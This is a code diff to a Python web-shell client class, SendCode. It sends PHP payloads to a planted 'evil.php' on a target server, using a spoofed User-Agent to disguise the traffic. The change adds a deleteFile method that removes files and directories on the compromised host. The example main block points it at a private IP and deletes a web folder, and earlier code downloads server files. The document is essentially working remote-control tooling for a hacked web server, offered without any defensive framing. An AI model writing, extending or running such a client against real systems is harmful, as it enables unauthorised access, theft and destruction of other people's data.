@@ -1,5 +1,5 @@
 import requests
-from nife.core.phpCodeFun import getFilelistBase, getFilePathBase, getFile
+from nife.core.phpCodeFun import getFilelistBase, getFilePathBase, getFile, deleteFile
 from nife.core.fakeUseAgent import fake_agent
 import json
 import os
@@ -56,6 +56,7 @@ class SendCode(object):
         保存文件到服务器，返回文件的路径
         :param path:
         :return:
+
         """
         self.data["ek"] = getFile(path=path)
         header = {
@@ -69,9 +70,26 @@ class SendCode(object):
             f.write(res.content)
         return filepath
 
+    def deleteFile(self, path):
+        """
+        删除文件
+        :param path:
+        :return: 1 or 0
+        """
+        self.data["ek"] = deleteFile(path=path)
+        header = {
+            "User-Agent": fake_agent()
+        }
+        # res = self.r.post(url=self.url, data=self.data, headers=header, proxies={"http": '127.0.0.1:8080'})
+        res = self.r.post(url=self.url, data=self.data, headers=header)
+        page = etree.HTML(res.text)
+        val = page.xpath('//ek/text()')[0]
+        return val
+
 
 if __name__ == '__main__':
     # s = SendCode("http://172.28.100.13/PhpstormProjects/Cnife/eval_fun.php", 'cmd')
-    s = SendCode("http://192.168.43.50/evil.php", 'cmd')
-    path = s.getFile('2.jpg', r"C:\Users\elloit\Desktop\php\PHPTutorial\WWW\BWVS\favicon\2.jpg")
+    s = SendCode("http://172.28.100.84/evil.php", 'cmd')
+    path = s.deleteFile("C:/Users/elloit/Desktop/php/PHPTutorial/WWW/121/")
     print(path)
+
